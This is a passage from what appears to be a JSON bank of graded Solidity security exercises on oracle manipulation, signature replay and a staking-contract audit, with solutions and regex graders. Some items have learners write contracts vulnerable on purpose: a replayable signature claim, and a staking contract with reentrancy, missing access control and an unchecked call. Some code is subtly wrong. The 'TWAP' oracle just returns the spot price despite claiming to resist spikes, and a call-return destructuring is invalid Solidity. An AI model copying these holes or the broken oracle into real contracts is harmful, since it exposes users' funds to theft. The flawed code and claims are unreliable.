          "message": "Define contract NaiveOracle."
        },
        {
          "type": "matchesRegex",
          "pattern": "IPair\\s+public\\s+pair",
          "message": "Store an IPair public pair."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+getPrice\\s*\\(\\s*\\)\\s+external\\s+view\\s+returns\\s*\\(\\s*uint256\\s*\\)",
          "message": "getPrice() external view returns (uint256)."
        },
        {
          "type": "matchesRegex",
          "pattern": "pair\\.getReserves\\(\\s*\\)",
          "message": "Read the reserves with pair.getReserves()."
        },
        {
          "type": "matchesRegex",
          "pattern": "reserveB\\s*\\)?\\s*\\*\\s*1e18\\s*/\\s*uint256\\(\\s*reserveA",
          "message": "Return uint256(reserveB) * 1e18 / uint256(reserveA)."
        }
      ]
    },
    "explanation": "<p>The lesson is that any price you can move within a single transaction is not a price, it is an input the attacker controls. The next challenge builds the two standard mitigations: a time-weighted average that a one-block spike cannot shift, and a deviation bound against a second independent source.</p>"
  },
  {
    "id": 379,
    "title": "Oracle Manipulation: TWAP and a Deviation Bound",
    "difficulty": "hard",
    "topic": "Security: Oracle Manipulation",
    "level": 9,
    "xp": 25,
    "instructions": "<p>A spot price fails because it reflects one instant that an attacker can own. Both standard defences take that lever away. A <strong>time-weighted average price</strong> (TWAP) accumulates <code>price &times; secondsElapsed</code> into a running total and, over a window, reports <code>(accumulatorNow &minus; accumulatorThen) / elapsed</code>. To move a 30-minute average by 10% an attacker has to hold the manipulated price for minutes, across blocks, exposed to arbitrage the whole time, expensive and risky instead of free. The second defence is a <strong>deviation bound</strong>: compare your price to an independent source (a Chainlink feed, another pool) and reject it if the two disagree by more than a few percent. Level 6's consensus work is the intuition, one node can lie, agreement across independent parties is what you trust.</p>\n<p>This challenge is a skeleton, not a production oracle: real Uniswap V2 integrations read the pair's own <code>price0CumulativeLast</code> rather than accumulating locally. You are matching the <em>structure</em> (a cumulative accumulator, an elapsed-time divisor, and a bound check) so you recognise a sound oracle when you read one.</p>\n<ul>\n  <li><strong>cumulative accumulator:</strong> a monotonically growing sum of <code>price &times; time</code>; differences of it over an interval give the average price for that interval.</li>\n  <li><strong>elapsed time:</strong> <code>block.timestamp &minus; blockTimestampLast</code>; the window you divide by, and the minimum you require before trusting an update.</li>\n  <li><strong>deviation bound:</strong> a <code>require</code> that a candidate price is within X% of a reference, so a single skewed source cannot pass on its own.</li>\n</ul>\n<p class=\"blueprint-line\"><code>uint256 elapsed = block.timestamp - blockTimestampLast;</code><br><code>priceCumulativeLast += spot * elapsed;</code><br><code>twap = (newCumulative - priceCumulativeLast) / elapsed;</code><br><code>require(diff * 100 &lt;= twap * 5);</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>uint256 elapsed = block.timestamp - blockTimestampLast;\nrequire(elapsed >= WINDOW, \"window not elapsed\");\nuint256 newCumulative = priceCumulativeLast + spot * elapsed;\ntwap = (newCumulative - priceCumulativeLast) / elapsed;   // average over the window\npriceCumulativeLast = newCumulative;\nblockTimestampLast = block.timestamp;</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The grader only reads your text; it cannot advance <code>block.timestamp</code> or run a window. Try it properly in <code>remix.ethereum.org</code> with a mock pair: call <code>update</code>, use the VM's \"increase time\" to jump past <code>WINDOW</code>, change the reserves, call <code>update</code> again, and see how little a single spike moves <code>twap</code>.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>interface IPair</code> with <code>getReserves() external view returns (uint112 reserveA, uint112 reserveB)</code>. Write <code>contract TwapOracle</code> with <code>uint256 public constant WINDOW = 1800;</code>, <code>uint256 public priceCumulativeLast;</code>, <code>uint256 public blockTimestampLast;</code>, and <code>uint256 public twap;</code>. In <code>function update() external</code>: set <code>uint256 elapsed = block.timestamp - blockTimestampLast;</code>, <code>require(elapsed &gt;= WINDOW ...)</code>, read the reserves, compute <code>uint256 spot = uint256(reserveB) * 1e18 / uint256(reserveA);</code>, then <code>uint256 newCumulative = priceCumulativeLast + spot * elapsed;</code>, <code>twap = (newCumulative - priceCumulativeLast) / elapsed;</code>, <code>priceCumulativeLast = newCumulative;</code>, and <code>blockTimestampLast = block.timestamp;</code>. Add <code>function withinBound(uint256 externalPrice) external view returns (bool)</code> that computes <code>uint256 diff = externalPrice &gt; twap ? externalPrice - twap : twap - externalPrice;</code> and does <code>require(diff * 100 &lt;= twap * 5 ...)</code> before returning <code>true</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">update() before WINDOW elapsed</span><code class=\"io-val\">reverts: \"window not elapsed\"</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">withinBound(price 6% off twap)</span><code class=\"io-val\">reverts: deviation too large</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "interface IPair {",
      "    function getReserves() external view returns (uint112 reserveA, uint112 reserveB);",
      "}",
      "",
      "contract TwapOracle {",
      "    IPair public pair;",
      "    uint256 public constant WINDOW = 1800;",
      "    uint256 public priceCumulativeLast;",
      "    uint256 public blockTimestampLast;",
      "    uint256 public twap;",
      "",
      "    constructor(IPair _pair) {",
      "        pair = _pair;",
      "        blockTimestampLast = block.timestamp;",
      "    }",
      "",
      "    function update() external {",
      "        uint256 elapsed = block.timestamp - blockTimestampLast;",
      "        require(elapsed >= WINDOW, \"window not elapsed\");",
      "        (uint112 reserveA, uint112 reserveB) = pair.getReserves();",
      "        uint256 spot = uint256(reserveB) * 1e18 / uint256(reserveA);",
      "        uint256 newCumulative = priceCumulativeLast + spot * elapsed;",
      "        twap = (newCumulative - priceCumulativeLast) / elapsed;",
      "        priceCumulativeLast = newCumulative;",
      "        blockTimestampLast = block.timestamp;",
      "    }",
      "",
      "    function withinBound(uint256 externalPrice) external view returns (bool) {",
      "        uint256 diff = externalPrice > twap ? externalPrice - twap : twap - externalPrice;",
      "        require(diff * 100 <= twap * 5, \"deviation too large\");",
      "        return true;",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write TwapOracle: cumulative accumulator + elapsed-time average + a deviation bound\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ninterface IPair {\n    function getReserves() external view returns (uint112 reserveA, uint112 reserveB);\n}\n\ncontract TwapOracle {\n    IPair public pair;\n    uint256 public constant WINDOW = 1800;\n    uint256 public priceCumulativeLast;\n    uint256 public blockTimestampLast;\n    uint256 public twap;\n\n    constructor(IPair _pair) {\n        pair = _pair;\n        blockTimestampLast = block.timestamp;\n    }\n\n    function update() external {\n        uint256 elapsed = block.timestamp - blockTimestampLast;\n        require(elapsed >= WINDOW, \"window not elapsed\");\n        (uint112 reserveA, uint112 reserveB) = pair.getReserves();\n        uint256 spot = uint256(reserveB) * 1e18 / uint256(reserveA);\n        uint256 newCumulative = priceCumulativeLast + spot * elapsed;\n        twap = (newCumulative - priceCumulativeLast) / elapsed;\n        priceCumulativeLast = newCumulative;\n        blockTimestampLast = block.timestamp;\n    }\n\n    function withinBound(uint256 externalPrice) external view returns (bool) {\n        uint256 diff = externalPrice > twap ? externalPrice - twap : twap - externalPrice;\n        require(diff * 100 <= twap * 5, \"deviation too large\");\n        return true;\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "uint256\\s+public\\s+constant\\s+WINDOW\\s*=\\s*1800",
          "message": "Declare uint256 public constant WINDOW = 1800;"
        },
        {
          "type": "matchesRegex",
          "pattern": "uint256\\s+public\\s+priceCumulativeLast",
          "message": "Declare uint256 public priceCumulativeLast;"
        },
        {
          "type": "matchesRegex",
          "pattern": "uint256\\s+public\\s+blockTimestampLast",
          "message": "Declare uint256 public blockTimestampLast;"
        },
        {
          "type": "matchesRegex",
          "pattern": "elapsed\\s*=\\s*block\\.timestamp\\s*-\\s*blockTimestampLast",
          "message": "Compute elapsed = block.timestamp - blockTimestampLast;"
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*elapsed\\s*>=\\s*WINDOW",
          "message": "Require the window has elapsed: require(elapsed >= WINDOW ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "priceCumulativeLast\\s*\\+\\s*spot\\s*\\*\\s*elapsed",
          "message": "Accumulate: newCumulative = priceCumulativeLast + spot * elapsed;"
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*newCumulative\\s*-\\s*priceCumulativeLast\\s*\\)\\s*/\\s*elapsed",
          "message": "Average over the window: twap = (newCumulative - priceCumulativeLast) / elapsed;"
        },
        {
          "type": "matchesRegex",
          "pattern": "diff\\s*=\\s*externalPrice\\s*>\\s*twap\\s*\\?",
          "message": "Compute diff = externalPrice > twap ? externalPrice - twap : twap - externalPrice;"
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*diff\\s*\\*\\s*100\\s*<=\\s*twap\\s*\\*\\s*5",
          "message": "Bound the deviation: require(diff * 100 <= twap * 5 ...)."
        }
      ]
    },
    "explanation": "<p>Production systems lean on Chainlink price feeds precisely because they are an aggregate of many independent reporters with staleness and deviation checks baked in, the same two ideas you just wrote, run at protocol scale. When you must use an on-chain pool directly, a TWAP with a sensible window plus a sanity bound is the minimum bar.</p>"
  },
  {
    "id": 380,
    "title": "Signature Replay: No Nonce, No Domain",
    "difficulty": "hard",
    "topic": "Security: Signature Replay",
    "level": 9,
    "xp": 25,
    "instructions": "<p>Level 6's real-signatures challenge showed that a signature proves <em>who</em> approved a message. It does not, by itself, say <em>when</em>, <em>where</em>, or <em>how many times</em>. A contract that lets anyone submit <code>(to, amount, signature)</code> and credits <code>to</code> once the signature recovers to a trusted signer has verified authorship and nothing else.</p>\n<p>So the same signed blob can be submitted again, credit <code>to</code> a second time, a hundredth time, because nothing in the contract records that this signature was already used. Worse, if the signed data does not include the chain id and this contract's own address, a signature meant for a testnet, or for a sibling contract, or for the same contract on another chain, is equally valid here. This is <strong>signature replay</strong>. You write the vulnerable verifier now; the next challenge adds the two things it is missing.</p>\n<ul>\n  <li><strong>ecrecover:</strong> the EVM builtin that takes a hash and <code>(v, r, s)</code> and returns the address whose key produced that signature, or the zero address on failure.</li>\n  <li><strong>replay:</strong> re-submitting a still-valid signature to trigger its effect more than once.</li>\n  <li><strong>domain binding:</strong> mixing <code>block.chainid</code> and <code>address(this)</code> into the signed hash so a signature is only valid for one contract on one chain. Absent here.</li>\n</ul>\n<p class=\"blueprint-line\"><code>bytes32 digest = keccak256(abi.encodePacked(to, amount));</code> &nbsp;&larr; no nonce, no chain id, no address(this)<br><code>require(ecrecover(digest, v, r, s) == signer);</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - nothing stops resubmission\nfunction claim(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {\n    bytes32 digest = keccak256(abi.encodePacked(to, amount));\n    require(ecrecover(digest, v, r, s) == signer, \"bad sig\");\n    balanceOf[to] += amount;   // call it again with the same args + sig -> credited again\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>This editor only checks text and has no signer to forge with. In <code>remix.ethereum.org</code>, sign a <code>(to, amount)</code> digest with a known key off-chain (Remix's console or a small script), call <code>claim</code> once, then call it again with the identical arguments and signature and watch the balance climb a second time.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract ReplayableClaim</code> with <code>address public signer</code> set in the constructor and <code>mapping(address =&gt; uint256) public balanceOf</code>. Add <code>function claim(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external</code> that computes <code>bytes32 digest = keccak256(abi.encodePacked(to, amount));</code>, does <code>require(ecrecover(digest, v, r, s) == signer ...)</code>, then <code>balanceOf[to] += amount;</code>. Do <strong>not</strong> add a nonce, the missing replay protection is the point.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">claim(to, 100, sig)</span><code class=\"io-val\">balanceOf[to] = 100</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">claim(to, 100, same sig) again</span><code class=\"io-val\">balanceOf[to] = 200</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract ReplayableClaim {",
      "    address public signer;",
      "    mapping(address => uint256) public balanceOf;",
      "",
      "    constructor(address _signer) {",
      "        signer = _signer;",
      "    }",
      "",
      "    function claim(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {",
      "        bytes32 digest = keccak256(abi.encodePacked(to, amount));",
      "        require(ecrecover(digest, v, r, s) == signer, \"bad sig\");",
      "        balanceOf[to] += amount;",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write ReplayableClaim.claim: verify a signature over (to, amount) with no nonce, no domain\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract ReplayableClaim {\n    address public signer;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _signer) {\n        signer = _signer;\n    }\n\n    function claim(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {\n        bytes32 digest = keccak256(abi.encodePacked(to, amount));\n        require(ecrecover(digest, v, r, s) == signer, \"bad sig\");\n        balanceOf[to] += amount;\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+ReplayableClaim\\s*\\{",
          "message": "Define contract ReplayableClaim."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+claim\\s*\\(\\s*address\\s+to\\s*,\\s*uint256\\s+amount\\s*,\\s*uint8\\s+v\\s*,\\s*bytes32\\s+r\\s*,\\s*bytes32\\s+s\\s*\\)\\s+external",
          "message": "Signature: function claim(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "keccak256\\(\\s*abi\\.encodePacked\\(\\s*to\\s*,\\s*amount\\s*\\)\\s*\\)",
          "message": "digest = keccak256(abi.encodePacked(to, amount));"
        },
        {
          "type": "matchesRegex",
          "pattern": "ecrecover\\(\\s*digest\\s*,\\s*v\\s*,\\s*r\\s*,\\s*s\\s*\\)\\s*==\\s*signer",
          "message": "Verify with require(ecrecover(digest, v, r, s) == signer ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "balanceOf\\[to\\]\\s*\\+=\\s*amount",
          "message": "Credit with balanceOf[to] += amount;"
        },
        {
          "type": "matchesRegex",
          "pattern": "^(?![\\s\\S]*nonce)[\\s\\S]*$",
          "message": "This vulnerable version must contain NO nonce anywhere, that missing protection is the point; you add it next."
        }
      ]
    },
    "explanation": "<p>A signature is a fact about a message, not a one-time ticket, the contract has to make it single-use and context-specific. The next challenge adds a per-signer nonce so each signature works exactly once, and folds <code>block.chainid</code> and <code>address(this)</code> into the hash so it cannot wander to another deployment.</p>"
  },
  {
    "id": 381,
    "title": "Signature Replay: Nonce and Domain Binding",
    "difficulty": "hard",
    "topic": "Security: Signature Replay",
    "level": 9,
    "xp": 25,
    "instructions": "<p>Two additions turn the replayable verifier into a safe one. First, a <strong>per-signer nonce</strong>: the contract keeps <code>mapping(address =&gt; uint256) nonces</code>, the signed message must include the signer's current nonce, and the contract increments it on use. The same signature now recovers a digest whose nonce no longer matches, so it fails the second time. This is the same trick Ethereum itself uses, every transaction carries an account nonce so it cannot be mined twice.</p>\n<p>Second, <strong>domain binding</strong>: fold <code>block.chainid</code> and <code>address(this)</code> into the hash. A signature built for this contract on this chain then cannot be replayed against the same bytecode on another chain, or against a different instance. Production code does this through EIP-712 typed data, but the raw ingredients are exactly these two values.</p>\n<ul>\n  <li><strong>nonce:</strong> a per-signer counter included in the signed data and bumped on each successful use, making every signature single-use.</li>\n  <li><strong>block.chainid:</strong> the current chain's id; including it stops cross-chain replay.</li>\n  <li><strong>address(this):</strong> this contract's own address; including it stops the signature working against another contract.</li>\n</ul>\n<p class=\"blueprint-line\"><code>require(nonce == nonces[to]);</code><br><code>bytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));</code><br><code>require(ecrecover(digest, v, r, s) == signer);</code><br><code>nonces[to] += 1;</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>require(nonce == nonces[to], \"bad nonce\");\nbytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));\nrequire(ecrecover(digest, v, r, s) == signer, \"bad sig\");\nnonces[to] += 1;   // the same signature now recovers a stale digest</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The sandbox reads text only; it will not replay anything for you. In <code>remix.ethereum.org</code>, sign a digest that includes nonce 0, the chain id, and the contract address, call <code>claim</code> once, then resubmit the same signature and confirm it now reverts with \"bad nonce\".</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract SafeClaim</code> with <code>address public signer</code> (set in the constructor), <code>mapping(address =&gt; uint256) public nonces</code>, and <code>mapping(address =&gt; uint256) public balanceOf</code>. Add <code>function claim(address to, uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external</code> that: does <code>require(nonce == nonces[to] ...)</code>, computes <code>bytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));</code>, does <code>require(ecrecover(digest, v, r, s) == signer ...)</code>, then <code>nonces[to] += 1;</code> and <code>balanceOf[to] += amount;</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">claim(to, 100, nonce 0, sig)</span><code class=\"io-val\">balanceOf[to] = 100, nonces[to] = 1</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">replay same sig (nonce 0)</span><code class=\"io-val\">reverts: bad nonce</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract SafeClaim {",
      "    address public signer;",
      "    mapping(address => uint256) public nonces;",
      "    mapping(address => uint256) public balanceOf;",
      "",
      "    constructor(address _signer) {",
      "        signer = _signer;",
      "    }",
      "",
      "    function claim(address to, uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external {",
      "        require(nonce == nonces[to], \"bad nonce\");",
      "        bytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));",
      "        require(ecrecover(digest, v, r, s) == signer, \"bad sig\");",
      "        nonces[to] += 1;",
      "        balanceOf[to] += amount;",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write SafeClaim.claim: per-signer nonce + bind block.chainid and address(this) into the hash\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract SafeClaim {\n    address public signer;\n    mapping(address => uint256) public nonces;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _signer) {\n        signer = _signer;\n    }\n\n    function claim(address to, uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external {\n        require(nonce == nonces[to], \"bad nonce\");\n        bytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));\n        require(ecrecover(digest, v, r, s) == signer, \"bad sig\");\n        nonces[to] += 1;\n        balanceOf[to] += amount;\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+nonces",
          "message": "Declare: mapping(address => uint256) public nonces;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+claim\\s*\\(\\s*address\\s+to\\s*,\\s*uint256\\s+amount\\s*,\\s*uint256\\s+nonce\\s*,\\s*uint8\\s+v\\s*,\\s*bytes32\\s+r\\s*,\\s*bytes32\\s+s\\s*\\)\\s+external",
          "message": "claim must take (address to, uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s)."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*nonce\\s*==\\s*nonces\\[to\\]",
          "message": "Check the nonce: require(nonce == nonces[to] ...)."
        },
        {
          "type": "codeContains",
          "value": "block.chainid",
          "message": "Bind block.chainid into the signed hash."
        },
        {
          "type": "codeContains",
          "value": "address(this)",
          "message": "Bind address(this) into the signed hash."
        },
        {
          "type": "matchesRegex",
          "pattern": "abi\\.encodePacked\\(\\s*to\\s*,\\s*amount\\s*,\\s*nonce\\s*,\\s*block\\.chainid\\s*,\\s*address\\(this\\)\\s*\\)",
          "message": "digest = keccak256(abi.encodePacked(to, amount, nonce, block.chainid, address(this)));"
        },
        {
          "type": "matchesRegex",
          "pattern": "nonces\\[to\\]\\s*\\+=\\s*1",
          "message": "Increment the nonce on use: nonces[to] += 1;"
        },
        {
          "type": "matchesRegex",
          "pattern": "ecrecover\\(\\s*digest\\s*,\\s*v\\s*,\\s*r\\s*,\\s*s\\s*\\)\\s*==\\s*signer",
          "message": "Verify with require(ecrecover(digest, v, r, s) == signer ...)."
        }
      ]
    },
    "explanation": "<p>EIP-712 formalises exactly this: a domain separator carrying the chain id and contract address, plus structured, typed data with a nonce field. OpenZeppelin's <code>EIP712</code> and <code>Nonces</code> helpers, and the ERC-2612 <code>permit</code> on modern tokens, are all this pattern packaged so wallets can show users a readable message instead of a raw hash.</p>"
  },
  {
    "id": 382,
    "title": "Capstone: Find the Three Bugs",
    "difficulty": "hard",
    "topic": "Security: Capstone",
    "level": 9,
    "xp": 25,
    "instructions": "<p>Everything in this level so far has been one bug per challenge, named in the title. Real review is not like that: you get a contract, nobody tells you how many holes it has, and you have to find them. Below is <code>VulnerableStaking</code>, about fifty lines, with three planted bugs drawn straight from the patterns you have already practised, a reentrancy, a missing access-control check, and an unchecked low-level call. Read it and write down what you find.</p>\n<p>Because the grader matches text, you record the findings as three strings in a small <code>AuditReport</code> contract. Each string names the vulnerability class <em>and</em> the function it lives in, so <code>bug1</code> might read <code>\"reentrancy in withdraw\"</code>. That is the same discipline as a real finding title: class plus location, precise enough that someone can jump straight to the line.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">The contract under review</span>\n  <pre><code>// VulnerableStaking - three planted bugs\ncontract VulnerableStaking {\n    mapping(address => uint256) public staked;\n    uint256 public rewardRate = 1;\n    address public owner;\n\n    constructor() { owner = msg.sender; }\n\n    function stake() external payable {\n        staked[msg.sender] += msg.value;\n    }\n\n    function setRewardRate(uint256 newRate) external {\n        rewardRate = newRate;                       // (A)\n    }\n\n    function payReward(address to) public {\n        uint256 reward = staked[to] * rewardRate / 100;\n        to.call{value: reward}(\"\");                 // (B)\n    }\n\n    function withdraw() external {\n        uint256 amount = staked[msg.sender];\n        require(amount > 0, \"nothing staked\");\n        (bool ok) = msg.sender.call{value: amount}(\"\");   // (C)\n        require(ok, \"send failed\");\n        staked[msg.sender] = 0;\n    }\n\n    receive() external payable {}\n}</code></pre>\n</div>\n<ul>\n  <li><strong>finding title:</strong> a short label of the form \"class in location\", the vulnerability category plus the function or line it occurs in.</li>\n  <li><strong>vulnerability class:</strong> the reusable name for the flaw: reentrancy, access control, unchecked call, and so on, the same names as this level's topics.</li>\n</ul>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor only compares your strings against expected words; it is not analysing the contract. The real exercise is in <code>remix.ethereum.org</code>: reproduce each of the three bugs with a small attacker contract or a wrong-account call, then move on to the next challenge and rewrite the whole thing safely.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract AuditReport</code> with three <code>string public</code> variables. Set <code>bug1</code> to a string containing the word <code>reentrancy</code> and the function name <code>withdraw</code> (line C: the external call happens before <code>staked[msg.sender] = 0</code>). Set <code>bug2</code> to a string containing the words <code>access control</code> and the function name <code>setRewardRate</code> (line A: no owner check). Set <code>bug3</code> to a string containing the word <code>unchecked</code> and the function name <code>payReward</code> (line B: the <code>call</code> return value is ignored).</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">bug1</span><code class=\"io-val\">\"reentrancy in withdraw\"</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">bug2</span><code class=\"io-val\">\"missing access control in setRewardRate\"</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">bug3</span><code class=\"io-val\">\"unchecked call in payReward\"</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract AuditReport {",
      "    string public bug1 = \"reentrancy in withdraw\";",
      "    string public bug2 = \"missing access control in setRewardRate\";",
      "    string public bug3 = \"unchecked call in payReward\";",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Record the three findings as strings: \"class in function\"\ncontract AuditReport {\n    // string public bug1 = ...;\n}",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract AuditReport {\n    string public bug1 = \"reentrancy in withdraw\";\n    string public bug2 = \"missing access control in setRewardRate\";\n    string public bug3 = \"unchecked call in payReward\";\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "string\\s+public\\s+(?:constant\\s+)?bug1\\s*=\\s*\"",
          "message": "Declare string public bug1 = \"...\";"
        },
        {
          "type": "matchesRegex",
          "pattern": "string\\s+public\\s+(?:constant\\s+)?bug2\\s*=\\s*\"",
          "message": "Declare string public bug2 = \"...\";"
        },
        {
          "type": "matchesRegex",
          "pattern": "string\\s+public\\s+(?:constant\\s+)?bug3\\s*=\\s*\"",
          "message": "Declare string public bug3 = \"...\";"
        },
        {
          "type": "matchesRegex",
          "pattern": "bug1\\s*=\\s*\"(?=[^\"]*reentran)(?=[^\"]*withdraw)[^\"]*\"",
          "message": "bug1 must name the class (reentrancy) and the function (withdraw)."
        },
        {
          "type": "matchesRegex",
          "pattern": "bug2\\s*=\\s*\"(?=[^\"]*access control)(?=[^\"]*setRewardRate)[^\"]*\"",
          "message": "bug2 must contain \"access control\" and the function name setRewardRate."
        },
        {
          "type": "matchesRegex",
          "pattern": "bug3\\s*=\\s*\"(?=[^\"]*unchecked)(?=[^\"]*payReward)[^\"]*\"",
          "message": "bug3 must contain \"unchecked\" and the function name payReward."
        }
      ]
    },
    "explanation": "<p>Naming a finding as \"class in location\" is what makes a review actionable and what lets you group similar issues across a codebase. In the next challenge you rewrite <code>VulnerableStaking</code> with every one of these closed, a reentrancy guard and CEI ordering, an <code>onlyOwner</code> on the setter, a checked call, plus events and custom errors so the safe version is also legible.</p>"
  },
  {
    "id": 383,
    "title": "Capstone: Ship the Hardened Version",
    "difficulty": "hard",
    "topic": "Security: Capstone",
    "level": 9,
    "xp": 25,
    "instructions": "<p>You catalogued three bugs in <code>VulnerableStaking</code>: a reentrancy in <code>withdraw</code>, a missing owner check on <code>setRewardRate</code>, and an unchecked <code>call</code> in the reward payout. Now write the version you would actually deploy. Fixing the three holes is the floor; a contract you would ship also announces its state changes with events and fails with named errors instead of bare reverts, so the people integrating with it and the people reviewing it can both follow along.</p>\n<p>This pulls together the whole level: a <code>nonReentrant</code> guard plus checks-effects-interactions in <code>withdraw</code>, <code>onlyOwner</code> on the privileged setter, a checked send, an <code>event</code> per mutation, and <code>error</code> types for the revert paths.</p>\n<ul>\n  <li><strong>custom error:</strong> <code>error Name();</code> declared once and used as <code>revert Name();</code>, cheaper and machine-readable compared with a <code>require</code> string.</li>\n  <li><strong>event:</strong> <code>event Name(address indexed who, uint256 amount);</code> plus <code>emit</code>; the off-chain record of what happened, and the thing your tests and frontends listen for.</li>\n  <li><strong>defence in depth:</strong> the guard and the CEI ordering both independently stop the reentrancy; you keep both.</li>\n</ul>\n<p class=\"blueprint-line\"><code>modifier nonReentrant() { require(!locked); locked = true; _; locked = false; }</code><br><code>function withdraw() external nonReentrant { ...; staked[msg.sender] = 0; emit Withdrawn(...); (bool ok) = msg.sender.call{value: amount}(\"\"); if (!ok) revert TransferFailed(); }</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>function setRewardRate(uint256 newRate) external onlyOwner {\n    rewardRate = newRate;\n    emit RewardRateChanged(newRate);\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>As always the editor is only reading your text. The payoff is in <code>remix.ethereum.org</code>: point the same attacker contract from the previous challenge at this version and watch the re-entry revert, call <code>setRewardRate</code> from a non-owner and watch <code>NotOwner</code> fire, and check the emitted logs after each call.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract HardenedStaking</code>. State: <code>mapping(address =&gt; uint256) public staked</code>, <code>uint256 public rewardRate</code>, <code>address public owner</code>, <code>bool private locked</code>. Declare <code>error NotOwner();</code> and <code>error TransferFailed();</code>, and <code>event Withdrawn(address indexed user, uint256 amount);</code>. Add <code>modifier onlyOwner()</code> using <code>if (msg.sender != owner) revert NotOwner();</code> and <code>modifier nonReentrant()</code> using <code>require(!locked ...)</code>. Add <code>setRewardRate(uint256 newRate) external onlyOwner</code>. Add <code>withdraw() external nonReentrant</code> that reads <code>uint256 amount = staked[msg.sender];</code>, reverts if it is zero, sets <code>staked[msg.sender] = 0;</code> and <code>emit Withdrawn(...)</code> <em>before</em> <code>(bool ok) = msg.sender.call{value: amount}(\"\")</code>, then <code>if (!ok) revert TransferFailed();</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">order inside withdraw</span><code 